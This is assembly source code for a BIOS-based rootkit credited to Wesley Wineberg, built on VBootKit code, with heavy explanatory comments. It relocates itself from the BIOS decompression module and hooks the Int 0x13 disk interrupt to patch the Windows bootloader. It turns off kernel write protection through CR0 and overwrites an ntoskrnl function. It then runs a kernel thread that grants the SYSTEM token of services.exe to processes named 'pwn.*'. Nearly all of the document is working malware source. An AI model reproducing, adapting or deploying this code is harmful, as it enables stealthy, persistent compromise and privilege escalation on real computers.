;;;;;;;;;;;;;;;;;
; BIOS Based Rootkit by Wesley Wineberg - www.exfiltrated.com
;
; Code included from VBootKit, authored by Nitin Kumar & Vipin Kumar of www.nvlabs.in
; Please credit original authors if you distribute or modify this code.

;;;;;;;;;;;;;;;;;
; This section of code is run the first time the decompression module is run.  This code will move all of the code 
; contained in this file (apart from the code required for the initial moving) to memory offset 0x8000, and patch the
; calling address so that it points to offset 0x8000 for each time that it is called in the future.

start_mover:

	; The following two push instructions will save the current state of the registers onto the stack.  This will
	; allow the decompression module to continue execution where it left off after we return.
    pusha
    pushf

	; Segment registers are cleared as we will be moving all code to segment 0
    xor ax, ax				; (This may or may not be obvious, but xor'ing the register sets it to 0.
    xor di, di				; XOR'ing a register is faster than moving a 0 to it on some systems.
    xor si, si
    push cs					; Push the code segment into the data segment, so we can overwrite the calling address code
    pop ds					; (CS is moved to DS here)
    mov es, ax 				; Destination segment (0x0000)
    mov di, 0x8000		 	; Destination offset, all code runs from 0x8000 
    mov cx, 0x4fff		 	; The size of the code to copy, approximated as copying extra doesn't hurt anything

	; The following call serves no program flow purposes, but will cause the calling address (ie, where this code
	; is executing from) onto the stack.  This allows the code to generically patch itself no matter where it might
	; be in memory.  If this technique was not used, knowledge of where in memory the decompression module would be
	; loaded would be required in advance (so it could be hard coded), which is not a good solution as it differs
	; for every system.
    call b
b:
    pop si					; This will pop our current address of the stack (basically like copying the EIP register)
    add si, 0x30 			; How far ahead we need to copy our code
    rep movsw				; This will repeat calling the movsw command until cx is decremented to 0.  When this command is finished, our code will be copied to 0x8000

    mov ax, word [esp+0x12] 	; This will get the caller address to patch the original hook
    sub ax, 3					; Backtrack to the start of the calling address, not where it left off
    mov byte [eax], 0x9a		; The calling function needs to be changed to an Call Far instead of the Call Near that it currently is
    add ax, 1					; Move ahead to set a new adress to be called in future
    mov word [eax], 0x8000 		; The new address for this code to be called at 
    mov word [eax+2], 0x0000	; The new segment (0)

    ; The code has now been relocated and the calling function patched, so everything can be restored and we can return.
    popf
    popa

    ; The following instructions were overwritten with the patch to the DECOMPC0.ROM module, so we need to run them now before we return.
    mov bx,es
    mov fs,bx
    mov ds,ax
    ret						; Updated to a near return

    
    
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;    
; The following section of code is called every time the decompression module is run.  The purpose of this code is to check that the video interrupts
; have been enabled, and then to check that the hard drive interrupts have been fully initialized.  The decompression module is only executed a fixed
; number of times based on the number of compressed BIOS modules, so we need to hook additional functions to continue the execution of this code.

rootkit_loader_start:
	nop						; While these nop's serve no purpose, they make it easier to identify sections of code when debugging.
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
        

    pusha					; Once again all registers are pushed onto the stack so that execution of the decompression module can continue after this code
    pushf					; has finished running
    
    xor di,di				; Set the data segments to 0 so that we can check the interrupts (which are 4 byte long jump addresses, which make up the 
    						; interrupt descriptor table (IDT).  This table starts at 0x0000, and continues to 0x03ff.   
	mov ds,di		
	cmp byte [0x19*4],0x00	; Check to see if int 19 is initialized, or if it is still pointing at 0
	jne ifint				; If it is not 0, return, otherwise perform one additional check.

noint:
    ;jmp noint				; Loop to debug
    popf					; Restore the registers which were previously saved
    popa
        
    mov bx, es				; Execute the commands that were overwritten by the Call Far which was required to jump to this code
	mov fs, bx
	mov ds, ax
    retf


ifint:						; Int 19 may be initialized, but not to a point where it is useable yet.  This will perform one additional check
	cmp byte [0x19*4],0x46
    je noint

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; The video interrupt has been initialized, rootkit code loading continues here

initshellcode:

    ; Set screen mode for VGA output
    mov ax,0x0003
    int 0x10					; Int 0x10 is used for video output
    
    
    
    mov ah,0x0e
    mov al,0x57					; AL contains the character to output, in this case it is a W
    mov bx,0
    int 0x10
      
    call sleep					; This is a very basic sleep function so that our output can stay displayed for slightly longer
             	
    mov ax, 0x9e00				
    mov ds,ax					; Set the data segment to 0x9e00, which is where the rootkit code will eventually be loaded.  Currently we are
    							; just storing a counter there so that we know how many modules have been decompressed
    mov eax,[0x0]
    inc eax						; Increment the module count each time this is called
    cmp eax, 0x09				; We want to have decompressed at least 9 modules before we're ready
    jge nextpt
    mov [0x0], eax				; Write the updated count into memory
    	
    	
    popf						; If our count is too low we can simply restore registers and code and then return.
    popa
    mov bx, es
    mov fs, bx
    mov ds, ax
    retf
    	
        
sleep:							; This sleep function will call the outer loop 0x1ff times, which should result in around an half second delay 
								; depending on the hardware it is running on.
    mov cx, 0x1ff
l1:								; Outer loop
    push cx
    mov cx,0xffff
l2:								; Inner loop
    loop l2
    pop cx
    loop l1
    ret
        
writechar:						; This function is not currently used, but can be used to output one character onto the screen..
	push bx
    mov ah,0x0e
    mov bx,0x0000
    int 0x10
    pop bx
	ret   

		
nextpt:							; Disk interrupts are initialized, load the rootkit into memory


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;
; Much of the following code was written by Nitin Kumar & Vipin Kumar of nvlabs.in.  The initial bootkit loading code
; was modified by myself (Wes Wineberg) so that it will load properly from where it has been placed into memory by the
; BIOS.  Originally this code would load from CD, which would take place when the system was in a different state, so
; quite a few changes were required.

	nop
	nop
; We need to instruct the compiler to start addressing from 0 again as this code will be executed from memory as if it
; is an independent application.  The loader code will likely be overwritten by the time this code is executed, so it
; needs to be designed and run seperately.

bootkit_start:					; This label is used to calculate the offset of the beginning of the bootkit code
section .restart vstart=0


; Ahead by 6F?


	cli							; The following instructions will set up the segment registers for moving the bootkit
    xor bx, bx					; within memory.
    mov ss, bx
  	mov [ss:0x7afe], sp			; The bootkit would originally be loaded into memory at 0x7c00 by the BIOS when it is
    mov sp, 0x7afe              ; loaded from CD.  Since we are not loading from CD but rather the BIOS itself, we 
    							; need to move the bootkit code back to just before 0x7b00 so that it is not 
    							; overwritten when the actual hard drive boot loader is moved into memory.  These 
    							; instructions set where the stack pointer should be located, the stack will grow
    							; "backwards" in memory from 0x7afe where it should not be overwritten.
    push ds
    pushad						; Save all registers so we can return cleanly when done.
    mov ds,bx					; The source segment register is set to 0 (we are running from 0:8000 right now)
    mov ax, [0x413]				; AX is now equal to whatever 0:0413 was pointing at.  This turns out to be: 0x27e
    sub ax, 2					; AX is 2 less
    mov [0x413], ax				; 0:0413 is now less by 2
    shl ax, 0x6					; Shift AX, even though we will simply be overwriting.
    mov ax, CODEBASEIN1MB		; Set AX to 0x9e00 so that we can set the destination stack pointer
    mov es, ax					; ES will be the destination stack pointer

    mov bx, 0x8000				; Set the source offset.  The following lines are not simply put together as one
    							; instruction as NASM gets mad with more than one add at once, which appears to be a bug.
    add bx, bootkit_start - rootkit_loader_start - 5		; This accounts for the start of this assembler file which
    														; we do not want to copy.  The -5 accounts for the segmentation
    														; gap included when we defined a new section in NASM.
    mov [bx + codereloc], ax    
    mov [bx + codeloc2], ax		; This will update multiple variables with the new locations of our code
    xor bx, bx
    
    cld
    mov si, 0x8000 + bootkit_start - rootkit_loader_start  - 5	; Similar to before, this points to the start of the 
    															; bootkit code.
    xor di, di
    mov cx, 0x400      			; Number of bytes to copy to new location.  This is in words, currently 2 kbs are loaded
    rep movsw					; Move memory from one location to another.
    sti
    mov ax, 0x201
    mov cl, 0x2
    cdq
        
    cli							; Clear interrupts
    mov eax, [0x4c]				; We are going to modify interrupt 0x13, which is located at 0:004c.
  	mov [es:INT13INTERRUPTVALUE], eax		; Int 0x13 is the hard drive handling interrupt.  This interrupt is disabled
  											; once the OS bootloader has been loaded into memory, but until that point
  											; it is used to handle all hard drive access.
	mov word [0x4c], newint13handler		; The IDT entries are 4 bytes long, so we need to properly patch the address they
											; contain so that our code is called instead.
    mov [0x4e], es
    sti										; Set interrupts
    
    push es									; We are now going to jump to where we have copied our rootkit to in memory, which
    										; is at 0x9e000, or 9e000:0.  
    push word newmemorycodestart			; We do not want to start executing this code all again, so we will jump right to
    										; next label and continue from there.  
    retf									; This isn't so much a return as it is a jump.
    
    
; This code should only ever be called from CODEBASEIN1MBEXACT (0x9e000), even though it will exist a number of different places
; in memory.  The remaining set of code just sets everything back to normal so that BIOS and system execution can continue, but
; we now have Int 0x13 hooked so that our code will run every time there is a disk access.
newmemorycodestart:
    mov es, dx								; This code is unnecessary when run from the BIOS, but would be used to load the 
    mov ax, 0x201							; real boot loader from the hard drive.  Since we are not booting from CD or 
    dec cx									; overwriting the boot loader in any way, we do not need to read it into memory, the
    mov dl, 0x80							; BIOS will do that for us.
    mov bh, 0x7c
    ;int 0x13								; (Disabled for BIOS execution)
        
    popad									; These three lines will restore the registers back to what they were before running
    pop ds									; the bootkit code.
    pop sp
        
    popf									; The following instructions will finish restoring everything for transition back into
    popa									; the decompression module, which is where we ran from originally.
    mov bx, es
    mov fs, bx
    mov ds, ax
    retf
  	
    ;jmp 0x0:0x7c00    						; If we were not running in BIOS mode, we could jump to the MBR code here instead.
 
    
    
    
; Once we have hooked Int 0x13 this will be called everytime there is a disk access.  This code will check what the disk operation is,
; and if a disk read is being performed we will check the data which has been read to determine if it is the windows bootloader code.  
newint13handler: 	    
    pushf									; Save all flags so we don't throw system execution off.
    cmp ah, 0x42							; If the disk operation is a 0x42 or 0x02 we want to examine the data which was read.
    jz processint13request
    cmp ah, 0x2
    jz processint13request
    popf									; Restore all flags
    jmp 0x0:0x0 							; Not a disk operation we are interested in, jump back to original Int 0x13 handler.  This
        									; address is filled in by earlier code dynamically so that its value does not need to be
        									; hardcoded.
    INT13INTERRUPTVALUE EQU $-4				; Used to point to the above address
    
processint13request:
    mov [cs:STOREAH], ah					; Save the type of disk operation before calling the original interrupt
    popf
    pushf									; Move flags from and to the stack
    call far [cs:INT13INTERRUPTVALUE] 		; Call the original Int 0x13 handler which was saved from the IVT.
    jc returnback 							; If the Int 0x13 operation failed we should just return.
    pushf
    cli
    push es
    pusha
    mov ah, 0x0       						; This 0 will be filled with the original AH value by the code above.
    STOREAH EQU $-1      
    cmp ah, 0x42							; Check the type of hard drive operation which was just executed.
    jnz notextrequest						; Handle data differently depending on hard drive operation.
    lodsw
    lodsw
    les bx, [si]
      
notextrequest:
    test al, al								; Check how much data was read
    jng scandone							; If no data was read, return
    cld
    mov cl, al
    mov al, 0x8b
    shl cx, 0x9
    mov di, bx
 scanloop:
    repne scasb								; Parse through all of the data
    jnz scandone							; If there is no more data to read then return.
    cmp dword [es:di], 0x74f685f0			; Check if the data matches a certain pattern of bytes which are only present in the
    										; bootloader.  This allows the code to have to effect on systems not running the 
    										; expected OS.  
    jnz scanloop
    cmp word [es:di+0x4], 0x8021
    jnz scanloop							; If all of the data does not match up continue searching.
    mov word [es:di-0x1], 0x15ff			; The bootloader code has now been found, so we will now patch it so that it calls
    										; our bootkit code as part of its execution.
    mov eax, cs
    shl eax, 0x4
    or [cs:updatecodeloc], eax
    add ax, CODE32START						; This is the address of our code that will be called next.
    mov [cs: dword_E5], eax
    sub ax, 0x4
    mov [es:di+0x1], eax
        
  
       
 
 scandone:           						; Restore everything to how it was when the Int 0x13 call was made
    popa
    pop es
    popf
returnback:  
    retf 0x2								; Return to system.  

     
; The following code is only really necessary when this bootkit is not being run from the BIOS (ie booting off a CD, etc).  This
; doesn't harm anything, and does make it easier to see the code seperation when debugging.
db 90h
db 90h
times 510-($-$$) db 0						; Fill the rest with zeros

DW 0xAA55          							; This is the HDD signature that the BIOS / Grub bootload will be looking for to determine
											; if this drive contains a bootable image.

   dword_E5:     dd 0
    
    
    
; Code will execute in 32 bit mode from this point on.  All the code from this point will be run by the bootloader and then the kernel
; itself.  No significant modifications have been made in the remaining code, it is simply used as a tool to implement the desired
; rootkit functionality.
USE32



CODE32START:   
 	            
                
    	    	pushfd
    	    	pushAd
 
    	    	; Display patch info on the screen 
  				mov     word [ds:0B8000h], 0x0250 ; 
                mov     word [ds:0B8002h], 0x0261
                mov     word [ds:0B8004h], 0x0274
                mov     word [ds:0B8006h], 0x0263
                mov     word [ds:0B8008h], 0x0268
                
                 
                mov     word [ds:0B800Ch], 0x0262 ; 
                mov     word [ds:0B800Eh], 0x0279

                mov     word [ds:0B8012h], 0x0257
                mov     word [ds:0B8014h], 0x0265
                mov     word [ds:0B8016h], 0x0273 ;
                 
                 
                mov     word [ds:0B801Ah], 0x0257 ; 
                mov     word [ds:0B801Ch], 0x0269
                mov     word [ds:0B801Eh], 0x026E
                mov     word [ds:0B8020h], 0x0265
                mov     word [ds:0B8022h], 0x0262
                 
                 
                mov     word [ds:0B8024h], 0x0265 ; 
                mov     word [ds:0B8026h], 0x0272
                mov     word [ds:0B8028h], 0x0267
   
                                      
  				mov eax,0           
  				mov ax,0
  				codeloc2 EQU $-2
  				shl eax,4
  				mov [eax + codereloc+ 4],eax
  
              
              
                 cld
                 mov     edi, [esp+24h]
                 and     edi, 0FFF00000h
                 mov     al, 0C7h ; '¦'

loc_F:                            

                scasb
                jnz     short loc_F
                cmp     dword [edi], 40003446h
                jnz     short loc_F
                mov     al, 0A1h ; 

loc_1C:                           
               scasb
               jnz     short loc_1C
               mov     esi, [edi]
               mov     esi, [esi] ;points to base of loader table
               
               mov     esi,[esi]  ;points to first entry it's Ntoskrnl.exe
               mov     edx,[esi]  ;points to second entry ,it's hal.dll
               
               
               add     esi,24    ; to obtain pointer to ntoskrnls, base address,it 24 bytes from it's entry
               mov     eax,[esi]
               mov [CODEBASEIN1MBEXACT + NTOSkrnlbase ],eax ; store result in code
               mov ebx,eax                       ;  store result in ebx register
               
               

             
               
               
         mov     word [ds:0B80A2h], 0231h     ;  Display 1 so we now we found the NT base addresss
                 

	pushfd
	pushad
	mov ebp,[CODEBASEIN1MBEXACT + NTOSkrnlbase]
	mov ebx,0x26f7bf31                   ;hash for ZwSetSystemInformation
	;mov ebx,0x7ede29ea                    ;hash for RtlZeroMemory
	call FindExportedFunctionbyHash
	mov dword [CODEBASEIN1MBEXACT + RtlZeroMemorylocation],eax
	popad
	popfd
        mov     word [ds:0B80A4h], 0232h     ;  Display 2 so we now we found the function we overwrite temporarily
                
                
                
         
                
                
        call findpend
        mov     word [ds:0B80A6h], 0233h   ;  Display 3 so we now we found the textual data in NTOSkrnl to overwrite
               
               
              
      	
 ;location we tempraily overwrite              
               
        add eax,0x55      ; NTOSKRNL BASE + 0x55
        mov dword [CODEBASEIN1MBEXACT+basetempbackdoor], eax
               

            
     
      
        
          mov     ecx, cr0
          mov edx, ecx
          and     ecx, 0FFFEFFFFh ;    Here above and below we are
                                        ; disabling protection in CR0 registers
          mov     cr0, ecx 
          
             
             
     
         
            
         
          ;  ebx points to  base of ntos krnl
         
  	     add ebx,0x55
            ;/copy original function code in ntoskrnl 
             mov edi,ebx 
             mov esi,[CODEBASEIN1MBEXACT + RtlZeroMemorylocation]
             mov ecx,backdoorend - backdoorstart ;
             rep movsb
           
            
            ;/stores our code in ntoskrnl 
             mov edi,  [CODEBASEIN1MBEXACT + NTOScodelocation2]     ;  initial value found by hand  0x804dc000 + 0x19b780  hardcoded;
                                                                   ;now it's finded dynamically
             mov esi,CODEBASEIN1MBEXACT
             mov ecx,codeends  ;;copy all code
             rep movsb
        
            
            
            ;/below 4 lines overwrite function in windows xp kernel with backdoor code
             mov edi,[CODEBASEIN1MBEXACT + RtlZeroMemorylocation]
             mov esi,CODEBASEIN1MBEXACT + backdoorstart
             mov ecx,backdoorend - backdoorstart
             rep movsb
        
     
         
        
             mov     word [ds:0B80A8h], 0234h       ;  Display 4 so we now we patched up successfully
                
             mov cr0,edx
              
              
                 
	popad
	popfd

	mov		esi, eax
	test		eax, eax
	jnz		short @PatchFunction_done_nojz

	pushfd
	add		dword [esp+4], 21h
	popfd
@PatchFunction_done_nojz:

	ret



updatecodeloc :
dd 0





;signature  5f 50 45 4e  for _PEN      ; after this location a number of kbs are free

findpend:
 ;below function searches memory for 5f 50 45 4e  for _PEN,this location is used to store code in NTOSkrnl;
  pushfd
  pushad
  mov edi, eax      ;       ;copy kernel base  to scan 
    
  searchagain:
              cmp dword [edi], 0x45505f53 ;         
              jne contpend
               
              
              ;hard code values used for testing,now these are found at runtime
      	   ;  mov edi,0x804dc000 + 0x199c20  ;;;;;;;;;;;;;;;0x80675604; 0x804dc000 + 0x199c20
      	   ;   mov edi,0x80400000+0x16aee0     ;for Win 2k SP0
               mov  [CODEBASEIN1MBEXACT + NTOScodelocation2],edi 
      
             jmp overpend         
      contpend:
                inc edi  
             inc eax 
             jmp searchagain
      overpend:
      popad
      popfd
      ret



db  'rootboot'


;this is the actual backdoor or kernel mode shell code and will be called only once
kernelmodeshellcode:
mov dword [CODEBASEKERNEL + Stack],esp


call SetOSVars

;jmp newthreadstartshere 
push dword 0
push CODEBASEKERNEL + newthreadstartshere     ; threadstartlocation
push dword 0
push dword 0
push dword 0
push dword 0    ; for THREAD_ALL_ACCESS
push CODEBASEKERNEL + Threadhandle

mov ebp,[CODEBASEKERNEL + NTOSkrnlbase]
mov ebx,0x5814a503
call FindExportedFunctionbyHash
call eax
mov dword esp,[CODEBASEKERNEL + Stack] ;correct the stack  ;correct stack and return
ret ;



;below code corrects and recovers the original function then calls our backdoor code only once
fullbackdoorcode:

 mov     ecx, cr0
 mov edx,ecx
 and     ecx, 0FFFEFFFFh ; Here above and below we are
                                        ; disabling protection in CR0 registers
 mov     cr0, ecx 
 mov edi,[CODEBASEKERNEL + RtlZeroMemorylocation]
 mov esi,0x804dc
 basetempbackdoor EQU $-4
 mov ecx,backdoorend - backdoorstart
 rep movsb
mov cr0,edx


 
              
call kernelmodeshellcode       ;call our shellcode
popad
popfd
push dword [CODEBASEKERNEL + RtlZeroMemorylocation]
ret


;this code temprarily replaces Zero fucntions as it gets called later when kernel gets initaliz\sed
;below code is used to replace rtlzeromemory function
backdoorstart EQU $
backdoor:
	     pushf
             pusha
             
             
             ;copy our code to ffdf0800
            mov edi,CODEBASEKERNEL
            mov esi,   0 ;;;  here location of copy of our code is placed in NTOSKRNL
 NTOScodelocation2 EQU $-4           
             mov ecx,codeends
             rep movsb    
                
	     push CODEBASEKERNEL+fullbackdoorcode
             ret
             
       
   
backdoorend EQU $   



; this function expects ebx contains 4 byte hash and ebp contains base address of target executable image
; this function also expects that you push a pointer where the function pointer will be store after the functions finds it



FindExportedFunctionbyHash:
        	
		xor ecx,ecx                   ;ecx stores function number
		
		mov edi,[ebp+0x3c] ; to get offset to pe header
		mov edi,[ebp+edi+0x78] ; to get offset to export table

		add edi,ebp
nextexporttableentry:
		mov edx,[edi+0x20]
		add edx,ebp
		mov esi,[edx+ecx*4]
		add esi,ebp
		xor eax,eax
		cdq

		
nextbyte:
		lodsb
		ror edx,0xd
		add edx,eax
		test al,al
		jnz nextbyte
		inc ecx       
		
		cmp edx,ebx
        	jnz  nextexporttableentry
		dec ecx             ; hash number found
	
		mov ebx,[edi+0x24]
 		add ebx,ebp
 		mov cx,[ebx+ecx*2]
		mov ebx,[edi+0x1c]
		add ebx,ebp
		mov eax,[ebx+ecx*4]
		add eax,ebp    ;//function address arrives in eax now
		ret   ;just return
	

;this functions hump to the function

CallExportedFunctionbyHash:
        	
		xor ecx,ecx                   ;ecx stores function number
		
		mov edi,[ebp+0x3c] ; to get offset to pe header
		mov edi,[ebp+edi+0x78] ; to get offset to export table

		add edi,ebp
callnextexporttableentry:
		mov edx,[edi+0x20]
		add edx,ebp
		mov esi,[edx+ecx*4]
		add esi,ebp
		xor eax,eax
		cdq

		
callnextbyte:
		lodsb
		ror edx,0xd
		add edx,eax
		test al,al
		jnz callnextbyte
		inc ecx       
		
		cmp edx,ebx
        	jnz  callnextexporttableentry
		dec ecx             ; hash number found
	
		mov ebx,[edi+0x24]
 		add ebx,ebp
 		mov cx,[ebx+ecx*2]
		mov ebx,[edi+0x1c]
		add ebx,ebp
		mov eax,[ebx+ecx*4]
		add eax,ebp    ;//function address arrives in eax now
		jmp eax   ;just call the function after finding it
		

;after function ends here

;this is the new thread which keeps on executing  nad runnin the shellcode
newthreadstartshere:

mov dword [CODEBASEKERNEL + Stack2],esp     ; save stack to protect it 

newthreadstartsafe :


;delays kernel
xor eax,eax
delayagain:
push eax
push dword CODEBASEKERNEL + Delaytime ;push pointer to delay time
push dword 0 ;; since wait is not alertable
push dword 0 ; since wait is kernel mode
mov dword ebp,[CODEBASEKERNEL + NTOSkrnlbase]
mov dword ebx,0x6c92c2c3         ;hash for KeDelayExecution
call CallExportedFunctionbyHash
pop eax
inc eax
cmp eax,6  ;wait around a half min
jne delayagain



mov ebp,[CODEBASEKERNEL + NTOSkrnlbase]
mov ebx,0xdaf46e78     ;Call IoGetCurrentProcess
call CallExportedFunctionbyHash         ;returns system eprocess in eax


mov dword [CODEBASEKERNEL + _EPROCESS],eax
mov eax,[CODEBASEKERNEL + _EPROCESS]  ; noe _EPROCESS for kernel or System is in eax
xor ecx,ecx
mov word cx, [CODEBASEKERNEL + Activelinkoffset]
add dword eax, ecx ; get address of EPROCESS+ActiveProcessLinks
@eproc_loop:
mov eax, [eax] ; get next EPROCESS struct
mov word cx, [CODEBASEKERNEL + Imagenameoffset]
cmp dword [eax+ecx], "SERV"            ; is it SERVICES.EXE? xp and 2k3 knows upper case
je outof
cmp dword [eax+ecx], "serv"            ; is it SERVICES.EXE? win2k knows lower case
je outof
jnz @eproc_loop

outof:

; now  we store services.exe security token, so as we use it later on
mov word cx, [CODEBASEKERNEL + SecurityTokenoffset]
mov ebx,[eax + ecx ] ;    to obtain token from offset of activeprocesslinks token
mov dword [CODEBASEKERNEL + token],ebx ;token has been stored


;now we start again from beginning to find all cmd.exe and then try to escalate them to SYSTEM priv

mov eax,[CODEBASEKERNEL + _EPROCESS]  ; noe _EPROCESS for kernel or System is in eax
mov word cx, [CODEBASEKERNEL + Activelinkoffset]
add eax, ecx ; get address of EPROCESS+ActiveProcessLinks



xor edx,edx
mov edx,[eax]       ;we will compare this value later on so we find out whether the list has been traversed fully 
mov eax, [eax]      ;so as to skip first process and check it when whole list has traversed

@cmd_search_loop:
mov eax, [eax] ; get next EPROCESS struct it get to next activeprocess link _EPROCESS + 0x88 for xp sp 0
;mov ecx, 0xEC ;;EP_ModuleName    module name offset in _EPROCESS     offset in memory is EC for WinXP SP0
xor ecx,ecx
mov word cx, [CODEBASEKERNEL + Imagenameoffset]
cmp dword [eax+ecx], "PWN."           	; Is it CMD.EXE? winxp knows upper case ; Changed to be less 
												; likely that our rootkit will take effect unintentionally.
je patchit
cmp dword [eax+ecx], "pwn."            	; is it cmd.exe?  win2k knows lower case
je patchit
jne donotpatchtoken          ;jmp takes 5 bytes but this takes 2 bytes
patchit:
mov word cx, [CODEBASEKERNEL + SecurityTokenoffset]
mov dword [eax + ecx],ebx   ;;;200-0x88],ebx      ;replace it with services.exe token, offset for sec token is 200

donotpatchtoken:

cmp edx,eax  ; have we traversed fully
jne @cmd_search_loop




push dword CODEBASEKERNEL + dbgmsg
mov dword ebp,[CODEBASEKERNEL + NTOSkrnlbase]
mov dword ebx,0x1b4347e9           ;hash for DbgPrint
call CallExportedFunctionbyHash

mov dword esp,[CODEBASEKERNEL + Stack2] ;correct the stack  ;correct stack and return 

jmp newthreadstartsafe              ;loop again




SetOSVars:
push dword 0
push dword 0
push dword CODEBASEKERNEL + OSMinorVersion
push dword 0
mov dword ebp,[CODEBASEKERNEL + NTOSkrnlbase]
mov dword ebx,0x0bf483cc          ;hash for PsGetVersion
call CallExportedFunctionbyHash
                 
cmp DWORD [CODEBASEKERNEL + OSMinorVersion],0        ;if its 0,then it's win2k 
jne  winxp
mov WORD [CODEBASEKERNEL + Activelinkoffset],0xA0 
mov WORD [CODEBASEKERNEL + Imagenameoffset],0x15c          ;          original at 1fc
mov WORD [CODEBASEKERNEL + SecurityTokenoffset],0x8c       ;         original at 12c
ret
winxp:

;first copy vars same for xp and 2k3
mov WORD [CODEBASEKERNEL + Activelinkoffset],0x88 ;this is absolute
mov WORD [CODEBASEKERNEL + SecurityTokenoffset],0x40       ;this is relative to avtivelinkoffset

cmp DWORD [CODEBASEKERNEL + OSMinorVersion],1         ;if its 1,then it's winXP
jne  win2k3
mov WORD [CODEBASEKERNEL + Imagenameoffset],0xEC              ;this is relative to avtivelinkoffset
ret

win2k3: ;it must be win2k3
mov WORD [CODEBASEKERNEL + Imagenameoffset],0xCC              ;this is relative to avtivelinkoffset
ret


RtlZeroMemorylocation:
dd  0


;db 'Ver'
OSMinorVersion:
dd 0

;db 'NTOSBASE'
NTOSkrnlbase:
dd 0;



;db 'CODERELOC'
codereloc:
dd 0
dd 0


;db 'Stack'
Stack:
dd 0


;db 'Stack'  ; stack for newly created thread
Stack2:
dd 0


;db 'Delaytime'   ;it value is -5 *10 * 1000 * 1000 for waiting 5 secs
Delaytime:
dd 0xFD050F80 ;
dd 0xffffffff


;db 'Hthread'
Threadhandle:
dd 0;

dbgmsg:
db "\nBIOS Kernel Hook Loaded.. Patch by Wes Wineberg\n",0

token:
dd 'token'
dd 0

_EPROCESS:
dd 0

;All OS Specific vars

Activelinkoffset:
dw 0

Imagenameoffset:
dw 0;

SecurityTokenoffset:
dw 0;



;donot declare anything below this

codeends EQU $ 




CODEBASEKERNEL EQU 0xffdf0900
CODEBASEIN1MB EQU 0x9e00 ;;;;      ;9d00 for compat with pxe boot
CODEBASEIN1MBEXACT EQU 0x9e000     ;;this is the exact
 